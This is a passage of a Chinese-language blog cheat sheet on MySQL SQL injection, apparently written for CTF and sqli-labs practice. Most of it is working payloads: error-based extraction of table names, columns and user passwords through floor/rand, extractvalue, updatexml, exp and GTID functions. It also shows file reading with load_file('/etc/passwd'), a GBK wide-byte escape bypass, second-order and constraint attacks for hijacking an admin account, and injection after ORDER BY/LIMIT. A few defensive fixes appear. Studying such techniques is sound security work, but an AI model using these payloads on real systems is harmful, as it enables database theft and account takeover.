class="hljs-keyword">where</span><br>table_schema<span class="hljs-operator">=</span>database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a;<br>爆字段<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),(concat((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span><br>table_schema<span class="hljs-operator">=</span>database() <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span>‘users’ limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),’<span class="hljs-operator">|</span>’,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)))x <span class="hljs-keyword">from</span> information_schema.tables<br><span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a;<br>爆数据<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),(concat((<span class="hljs-keyword">select</span> concat(name,’<span class="hljs-operator">|</span>’,passwd,’<span class="hljs-operator">|</span>’,birth) <span class="hljs-keyword">from</span> users limit<br><span class="hljs-number">0</span>,<span class="hljs-number">1</span>),’<span class="hljs-operator">|</span>’,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a;<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat((<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> (<span class="hljs-keyword">SELECT</span> concat(<span class="hljs-number">0x23</span>,name,<span class="hljs-number">0x3a</span>,passwd,<span class="hljs-number">0x23</span>) <span class="hljs-keyword">FROM</span> users limit<br><span class="hljs-number">0</span>,<span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> information_schema.tables limit <span class="hljs-number">3</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a<br></code></pre></td></tr></table></figure>

<p>几何函数 </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">GeometryCollection：id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> GeometryCollection((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span><span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br>polygon()：id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> polygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br>multipoint()：id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> multipoint((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br>multilinestring()：id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> multilinestring((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br>linestring()：id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> LINESTRING((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br>multipolygon() ：id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> multipolygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br></code></pre></td></tr></table></figure>

<p>不存在函数</p>
<blockquote>
<p>爆数据库</p>
<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032231655.jpg" srcset="/img/loading.gif" lazyload alt="image-20220708181105742"></p>
</blockquote>
<p>name_const()</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">获取版本信息<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> name_const(version(),<span class="hljs-number">0x1</span>),name_const(version(),<span class="hljs-number">0x1</span>))a;<br># <span class="hljs-number">1060</span> <span class="hljs-operator">-</span> Duplicate <span class="hljs-keyword">column</span> name <span class="hljs-string">&#x27;8.0.27&#x27;</span><br></code></pre></td></tr></table></figure>

<p>uuid相关函数</p>
<p>mysql:8.0.x</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">SELECT</span> UUID_TO_BIN((<span class="hljs-keyword">SELECT</span> password <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>));<br># <span class="hljs-number">1146</span> <span class="hljs-operator">-</span> <span class="hljs-keyword">Table</span> <span class="hljs-string">&#x27;test.users&#x27;</span> doesn<span class="hljs-string">&#x27;t exist</span><br><span class="hljs-string">mysql&gt; SELECT BIN_TO_UUID((SELECT password FROM users WHERE id=1));</span><br><span class="hljs-string"># 1146 - Table &#x27;</span>test.users<span class="hljs-string">&#x27; doesn&#x27;</span>t exist<br></code></pre></td></tr></table></figure>

<p>exp() 适用版本 5.5.5-5.5.49</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span>(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">USER</span>())a));<br><span class="hljs-comment">--其中，~符号为运算符，意思为一元字符反转，通常将字符串经过处理后变成大整数，再放到exp函 数内，得到的结果将超过mysql的double数组范围，从而报错输出。除了exp()之外，还有类似pow()之类的相似函数同样是可利用的，他们的原理相同。</span><br><span class="hljs-comment">--double 数值类型超出范围</span><br><span class="hljs-comment">--Exp()为以e 为底的对数函数；</span><br><br><span class="hljs-comment">--ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(~((select &#x27;root@localhost&#x27; from dual)))&#x27;</span><br><br>如果是在适用版本之外：虽然也会报错，但是表名不会出来<br><span class="hljs-keyword">select</span> <span class="hljs-operator">!</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)<span class="hljs-operator">-</span><span class="hljs-operator">~</span><span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>exp报错<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/articles/5509124.html">（转载）使用exp进行SQL报错注入 - lcamry - 博客园 (cnblogs.com)</a></p>
</blockquote>
<p>pow()结合盲注</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> pow(<span class="hljs-number">1</span><span class="hljs-operator">+</span>(表达式),<span class="hljs-number">999999999999</span>)<br># 表达式可以是盲注的形式，返回<span class="hljs-number">1</span>或者<span class="hljs-number">0</span>，通过报错将字符猜出来，报错回显的表达式是返回<span class="hljs-number">1</span>的<br># 同样方式用在exp上(临界值为<span class="hljs-number">709</span>)<br><span class="hljs-built_in">exp</span>(<span class="hljs-number">709</span><span class="hljs-operator">+</span>(表达式))<br></code></pre></td></tr></table></figure>

<p>bigint 溢出文章<a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/articles/5509112.html">http://www.cnblogs.com/lcamry/articles/5509112.html</a></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;?id=1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-operator">!</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x) <span class="hljs-operator">-</span> <span class="hljs-operator">~</span><span class="hljs-number">0</span>),<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>

<h3 id="xpath语法错误–较常用"><a href="#xpath语法错误–较常用" class="headerlink" title="xpath语法错误–较常用"></a>xpath语法错误–较常用</h3><p>报错原因，0x7e就是~不属于xpath语法格式</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> @<span class="hljs-variable">@version</span>),<span class="hljs-number">0x7e</span>));<br><span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> @<span class="hljs-variable">@version</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>);<br># 适用版本: <span class="hljs-number">5.1</span><span class="hljs-number">.5</span><span class="hljs-operator">+</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>updatexml三个参数</p>
<ul>
<li><p>第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc 1</p>
</li>
<li><p>第二个参数：XPath_string (Xpath 格式的字符串) ，如果不了解 Xpath 语法，可以在网上查找教程。</p>
</li>
<li><p>第三个参数：new_value，String 格式，替换查找到的符合条件的数据**</p>
</li>
</ul>
<p>注意加select防止不回显，当显示字符有限时，常用字符串截断substr配合</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> NAME_CONST(version(),<span class="hljs-number">1</span>),NAME_CONST(version(),<span class="hljs-number">1</span>))x;<br><span class="hljs-comment">--mysql 重复特性，此处重复了version，所以报错。</span><br></code></pre></td></tr></table></figure>
</blockquote>
<h3 id="Join-using-注列名"><a href="#Join-using-注列名" class="headerlink" title="Join using()注列名"></a>Join using()注列名</h3><p>mysql8修复</p>
<p>报错存在重复的列名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users)b)c; # 报错信息内回显第一列名称<br>mysql<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users)b <span class="hljs-keyword">using</span>(username))c;# 第二列<br>mysql<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users)b <span class="hljs-keyword">using</span>(username,password))c;# 第三列<br></code></pre></td></tr></table></figure>

<h3 id="GTID相关函数"><a href="#GTID相关函数" class="headerlink" title="GTID相关函数"></a>GTID相关函数</h3><p>版本&gt;&#x3D;5.6.5</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> gtid_subset(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>); # 报错回显用户<br>mysql<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> gtid_subset(hex(substr((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users limit<br><span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>);<br>mysql<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> gtid_subtract((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a),<span class="hljs-number">1</span>); # 报错回显用户<br></code></pre></td></tr></table></figure>

<h2 id="导入导出文件"><a href="#导入导出文件" class="headerlink" title="导入导出文件"></a>导入导出文件</h2><h3 id="查看限制"><a href="#查看限制" class="headerlink" title="查看限制"></a>查看限制</h3><p>secure_file_priv</p>
<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232760.jpg" srcset="/img/loading.gif" lazyload alt="image-20220708190755416"></p>
<h3 id="load-file-导出文件"><a href="#load-file-导出文件" class="headerlink" title="load_file()导出文件"></a>load_file()导出文件</h3><p>load_file(filename)</p>
<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232156.jpg" srcset="/img/loading.gif" lazyload alt="image-20220708190902690"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> load_file(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">convert</span>(load_file(&quot;/etc/passwd&quot;) <span class="hljs-keyword">using</span> utf8);<br></code></pre></td></tr></table></figure>

<p>详见<a target="_blank" rel="noopener" href="https://ccship.cn/2021/10/21/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">SQL注入总结 – cc (ccship.cn)</a></p>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="常见思路-1"><a href="#常见思路-1" class="headerlink" title="常见思路"></a>常见思路</h3><p>如果是单引号闭合</p>
<p>注册一个<code>admin&#39;#</code>账户，登录修改其密码，则实际改的是admin的密码</p>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>宽字节就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作，使得攻击者可以通过宽字节编码绕过SQL注入防御。</p>
<p>宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入。PHP的编码为UTF-8 而MySql的编码设置为了SET NAMES ‘gbk’ 或是SET character_set_client &#x3D;gbk，这样配置会引发编码转换从而导致的注入漏洞。</p>
<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><ul>
<li><p><strong>addslashes()</strong> ：这个函数在预定义字符之前添加反斜杠 \ 。预定义字符： 单引号 ‘ 、双引号 ” 、反斜杠 \ 、NULL。但是这个函数有一个特点就是虽然会添加反斜杠 \ 进行转义，但是 \ 并不会插入到数据库中。</p>
<blockquote>
<p>这个函数功能与魔术引号功能完全相同，如果魔术引号打开就不要用这个函数了</p>
</blockquote>
</li>
<li><p>三个魔术引号功能</p>
<blockquote>
<ol>
<li><p>magic_quotes_gpc 影响到 HTTP 请求数据（GET，POST 和 COOKIE）。不能在运行时改变。在 PHP 中默认值为 on。 参见 get_magic_quotes_gpc()。如果 magic_quotes_gpc 关闭时返回 0，开启时返回 1。在 PHP 5.4.0 起将始终返回 0，因为这个魔术引号功能已经从 PHP 中移除了。</p>
</li>
<li><p>magic_quotes_runtime 如果打开的话，大部份从外部来源取得数据并返回的函数，包括从数据库和文本文件，所返回的数据都会被反斜线转义。该选项可在运行的时改变，在 PHP 中的默认值为 off。 参见 set_magic_quotes_runtime() 和 get_magic_quotes_runtime()。</p>
</li>
<li><p>magic_quotes_sybase (魔术引号开关)如果打开的话，将会使用单引号对单引号进行转义而非反斜线。此选项会完全覆盖 magic_quotes_gpc。如果同时打开两个选项的话，单引号将会被转义成 ”。而双引号、反斜线 和 NULL 字符将不会进行转义。</p>
</li>
</ol>
</blockquote>
</li>
</ul>
<h3 id="gbk编码"><a href="#gbk编码" class="headerlink" title="gbk编码"></a>gbk编码</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">用户名输入：admin<span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; or 1=1#</span><br><span class="hljs-string">转义后为： admin%df\&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>#<br><span class="hljs-keyword">SET</span> character_set_client <span class="hljs-operator">=</span><span class="hljs-string">&#x27;gbk&#x27;</span>后：admin運<span class="hljs-string">&#x27; or 1=1#</span><br><span class="hljs-string">执行语句：... where username=&#x27;</span>admin運<span class="hljs-string">&#x27; or 1=1#&#x27;</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p><code>%df</code>吃掉<code>\</code>的原因是，<code>urlencode(\&#39;)</code>&#x3D;<code>%5c%27</code> ,添加%df后形成<code>%df%5c%27</code>,而上面提到的mysql 在GBK 编码方式的，第一位范围为0x00-0x7F时，当作一个字符。%df不在这个范围内，因此会将两个字节当做一个汉字，此时%df%5c 就是一个汉字，%27(‘) 则作为一个单独的符号在外面，同时也就达到了我们的目的</p>
</blockquote>
<h3 id="utf8编码、Latin1编码"><a href="#utf8编码、Latin1编码" class="headerlink" title="utf8编码、Latin1编码"></a>utf8编码、Latin1编码</h3><p>UTF-8编码是变长编码，可能有1~4个字节表示： </p>
<ul>
<li>一字节时范围是<code>[00-7F] </code></li>
<li>两字节时范围是<code>[C0-DF][80-BF]</code> </li>
<li>三字节时范围是<code>[E0-EF][80-BF][80-BF]</code> </li>
<li>四字节时范围是<code>[F0-F7][80-BF][80-BF][80-BF]</code></li>
</ul>
<blockquote>
<p>然后根据RFC 3629规范，又有一些字节值是不允许出现在UTF-8编码中, 所以最终，UTF-8第一字节的取值范围是：00-7F、C2-F4。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">输入：?username<span class="hljs-operator">=</span>admin<span class="hljs-operator">%</span>c2<br><span class="hljs-operator">%</span>c2是Latin1字符集不存在的字符，<span class="hljs-operator">%</span><span class="hljs-number">00</span><span class="hljs-operator">-</span><span class="hljs-operator">%</span><span class="hljs-number">7</span>F可以直接表示某个字符、<span class="hljs-operator">%</span>C2<span class="hljs-operator">-</span><span class="hljs-operator">%</span>F4不可以直接表示某个字符而只是其他长字节编码结果的首字节。对于不完整的长字节UTF<span class="hljs-number">-8</span>编码的字符，进行字符集转换时会直接忽略，所以admin<span class="hljs-operator">%</span>c2会变成admin<br></code></pre></td></tr></table></figure>

<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><ul>
<li><p>在调用 <strong>mysql_real_escape_string()</strong> 函数之前，先设置连接所使用的字符集为GBK ，<strong>mysql_set_charset&#x3D;(‘gbk’,$conn)</strong> 。</p>
</li>
<li><p>所以防止宽字节注入的另一个方法就是将 <strong>character_set_client</strong> 设置为binary(二进制)。需要在所有的sql语句前指定连接的形式是binary二进制：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;, $conn); <br></code></pre></td></tr></table></figure>

<blockquote>
<p>当我们的MySQL收到客户端的请求数据后，会认为他的编码是character_set_client所对应的编码，也就是二进制。然后再将它转换成character_set_connection所对应的编码。然后进入具体表和字段后，再转换成字段对应的编码。当查询结果产生后，会从表和字段的编码转换成character_set_results所对应的编码，返回给客户端。所以，当我们将character_set_client编码设置成了binary，就不存在宽字节注入的问题了，所有的数据都是以二进制的形式传递。</p>
</blockquote>
</li>
</ul>
<h2 id="约束攻击"><a href="#约束攻击" class="headerlink" title="约束攻击"></a>约束攻击</h2><p>当数据库字符串长度过短，并且后端没有对字符串进行长度限制时</p>
<p>select 语句对于参数后面空格的处理是删除，insert只是截取最大长度的字符串，然后插入数据库。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> users(<br>	username <span class="hljs-type">varchar</span>(<span class="hljs-number">25</span>),<br>  password <span class="hljs-type">varchar</span>(<span class="hljs-number">25</span>)<br>)<br></code></pre></td></tr></table></figure>

<p>最大长度限制(具体看表的定义)为25 我们输入用户名为 admin[20个空格]1,密码随意。脚本查询的时候因为用了select 语句，空格被删除，剩下了admin1。</p>
<p>注册时：INSERT取前25位-&gt;admin[20个空格]和自己设定的密码当成了一个新用户-&gt;select查找admin，返回两条</p>
<blockquote>
<p>数据库里面的空格也在查询的时候被删除了再比较</p>
</blockquote>
<h2 id="order-by-后的注入"><a href="#order-by-后的注入" class="headerlink" title="order by 后的注入"></a>order by 后的注入</h2><h3 id="order-by参数后注入"><a href="#order-by参数后注入" class="headerlink" title="order by参数后注入"></a>order by参数后注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sort&#x27;</span>];  <br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users ORDER BY <span class="hljs-subst">$id</span>&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>sort可以是sql语句，只要保证返回一行一列或者是一个数字或布尔类型也可以,一般有以下三种</p>
<ul>
<li><p>直接注入语句（要返回单行单列） ?sort&#x3D;(select ……)</p>
</li>
<li><p>利用函数rand ?sort&#x3D;rand(sql语句)</p>
<ul>
<li>利用的是rand(true)与rand(false)导致题目回显不同而构造盲注条件</li>
</ul>
<p>也可以用报错注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?sort<span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,<span class="hljs-built_in">floor</span>(rand()<span class="hljs-operator">*</span><span class="hljs-number">2</span>)))<br></code></pre></td></tr></table></figure>
</li>
<li><p>利用and ?sort&#x3D;1 and(sql语句)</p>
<ul>
<li>这里的sql语句可以用延时注入</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> If(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">116</span>,<span class="hljs-number">0</span>,sleep(<span class="hljs-number">5</span>))<br></code></pre></td></tr></table></figure></li>
</ul>
<h3 id="procedure-analyse-参数后注入"><a href="#procedure-analyse-参数后注入" class="headerlink" title="procedure analyse 参数后注入"></a>procedure analyse 参数后注入</h3><p>此方法适用于MySQL 5.x中，在limit语句后面的注入 利用procedure analyse 参数，我们可以执行报错注入。</p>
<p>同时，在procedure analyse 和order by 之间可以存在limit 参数，我们在实际应用中，往往也可能会存在limit 后的注入，可以利用procedure analyse 进行注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-46</span><span class="hljs-operator">/</span>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span>  <span class="hljs-keyword">procedure</span> analyse(extractvalue(rand(),con<br>cat(<span class="hljs-number">0x3a</span>,version())),<span class="hljs-number">1</span>)<br><span class="hljs-keyword">SELECT</span> field <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">&gt;</span><span class="hljs-number">0</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> id LIMIT <span class="hljs-number">1</span>,<span class="hljs-number">1</span> <span class="hljs-keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="hljs-number">0x3a</span>,version())),<span class="hljs-number">1</span>); <br># 如果不支持报错注入的话，还可以基于时间注入：<br><span class="hljs-keyword">SELECT</span> field <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> id LIMIT <span class="hljs-number">1</span>,<span class="hljs-number">1</span> <span class="hljs-keyword">PROCEDURE</span> analyse((<span class="hljs-keyword">select</span> extractvalue(rand(),concat(<span class="hljs-number">0x3a</span>,(IF(MID(version(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">LIKE</span> <span class="hljs-number">5</span>, BENCHMARK(<span class="hljs-number">5000000</span>,SHA1(<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>))))),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>

